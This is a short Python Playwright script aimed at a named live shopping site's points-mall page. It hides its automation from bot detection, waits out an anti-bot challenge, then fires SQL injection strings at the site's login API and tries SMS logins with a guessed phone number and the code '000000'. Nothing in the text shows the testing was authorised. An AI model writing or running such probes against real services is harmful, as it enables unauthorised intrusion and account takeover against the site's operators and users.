import json, os
from playwright.sync_api import sync_playwright
U=os.environ.get('PROBE_URL','https://m.lbtek.com/points-mall')
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
with sync_playwright() as p:
    b=p.chromium.launch(headless=False, args=['--disable-blink-features=AutomationControlled','--no-sandbox','--disable-dev-shm-usage'])
    ctx=b.new_context(user_agent=UA, viewport={'width':1366,'height':768}, locale='zh-CN', timezone_id='Asia/Shanghai')
    ctx.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined});window.chrome={runtime:{}};")
    page=ctx.new_page(); page.goto(U, wait_until='domcontentloaded', timeout=60000)
    for i in range(12):
        page.wait_for_timeout(2000)
        c=page.content()
        if 'arg1=' not in c and 'renderData' not in c: break
    print('ready',flush=True)
    res=page.evaluate("""async () => {
      const out={};
      const post=async(n,u,bd)=>{try{const r=await fetch(u,{method:'POST',headers:{'Content-Type':'application/json','lang':'zh-CN'},body:JSON.stringify(bd)});out[n]=r.status+'|'+(await r.text()).slice(0,300);}catch(e){out[n]='ERR '+String(e).slice(0,100);}};
      await post('inj_u1','/api/v1/auth/unifiedLogin',{identifier:"admin'-- ",password:'x'});
      await post('inj_u2','/api/v1/auth/unifiedLogin',{identifier:'admin',password:"' OR '1'='1"});
      await post('inj_u3','/api/v1/auth/unifiedLogin',{identifier:"' OR 1=1-- ",password:'x'});
      await post('sms_p1','/api/v1/auth/smsLogin',{phone:'19999999999',code:'000000'});
      await post('sms_p2','/api/v1/auth/smsLogin',{phone:'19999999999',verifyCode:'000000'});
      await post('sms_p3','/api/v1/auth/smsLogin',{phone:'19999999999',smsCode:'000000',code:'000000'});
      await post('cap_get','/api/v1/captcha/click',{});
      return out;
    }""")
    print('===== RESULTS =====',flush=True)
    for k,v in res.items(): print('%-10s %s'%(k,v),flush=True)
    b.close()
